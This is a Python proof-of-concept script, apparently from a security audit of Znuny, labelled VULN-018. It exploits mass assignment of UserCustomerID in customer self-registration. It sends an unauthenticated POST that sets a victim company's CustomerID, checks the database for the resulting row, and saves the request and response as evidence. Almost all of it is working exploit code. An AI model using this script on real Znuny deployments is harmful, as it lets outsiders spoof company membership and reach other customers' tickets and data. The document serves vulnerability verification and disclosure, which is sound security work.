#!/usr/bin/env python3
r"""
VULN-018 — CustomerCreateAccount mass-assigns UserCustomerID (self-registration on by default)
==============================================================================================
Vulnerable code : targets/Znuny/Kernel/System/Web/InterfaceCustomer.pm:917-929,1032
                  default Kernel/Config/Files/XML/Framework.xml (CustomerPanelCreateAccount = 1)
Vulnerability   : CWE-915 Mass Assignment

The registration handler binds the ENTIRE configurable CustomerUser Map from request params
(rather than a fixed safe set) and only defaults `UserCustomerID` to the email when absent. So a
self-registrant supplies their own `UserCustomerID` — inheriting whatever company scoping is keyed
on CustomerID. Self-registration ships enabled.

Provable unauth: POST CustomerCreateAccount with UserCustomerID=<victim company>, then confirm the
created customer_user row carries that attacker-chosen customer_id.
"""
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-018", "CustomerCreateAccount mass-assigns UserCustomerID (unauth self-reg)",
             ["InterfaceCustomer.pm:917-929 binds whole Map from params; UserCustomerID only defaulted"])
    import requests
    sfx = C.rid()
    victim_company = f"VictimCorp-{sfx}"
    email = f"attacker_{sfx}@example.test"
    s = requests.Session(); s.get(C.CUST_URL, timeout=20)
    data = {"Action": "CustomerCreateAccount", "Subaction": "CreateAccount",
            "UserTitle": "", "UserFirstname": "Mal", "UserLastname": "Lory",
            "UserEmail": email, "UserCustomerID": victim_company}
    C.log("STEP", f"unauth POST CustomerCreateAccount with UserCustomerID={victim_company}")
    r = s.post(C.CUST_URL, data=data, timeout=20)
    C.log("INFO", f"HTTP {r.status_code}")
    rows = C.db(f"SELECT login,customer_id FROM customer_user WHERE email='{email}'")
    C.log("PROOF", f"created customer_user row: {rows}")
    open(os.path.join(HERE, "request.http"), "w").write(
        "POST /znuny/customer.pl  Action=CustomerCreateAccount;Subaction=CreateAccount;"
        f"UserFirstname=Mal;UserLastname=Lory;UserEmail={email};UserCustomerID={victim_company}\n")
    open(os.path.join(HERE, "response.txt"), "w").write(f"customer_user row: {rows}\n")

    if rows and rows[0][1] == victim_company:
        C.confirmed(f"unauthenticated self-registration created a customer with attacker-chosen "
                    f"CustomerID '{victim_company}' (mass-assigned UserCustomerID) — identity/"
                    "company-scope spoofing out of the box.")
    else:
        C.failed(f"customer_id not attacker-controlled: {rows}")

if __name__ == "__main__":
    main()
